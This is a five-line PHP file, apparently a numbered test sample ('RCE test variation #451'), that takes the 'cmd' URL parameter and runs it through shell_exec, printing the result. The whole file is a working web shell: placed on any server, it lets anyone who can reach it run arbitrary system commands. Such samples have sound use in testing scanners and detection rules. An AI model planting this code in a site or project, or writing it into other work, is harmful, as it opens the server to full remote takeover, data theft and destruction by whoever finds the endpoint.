<?php
// RCE test variation #451
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>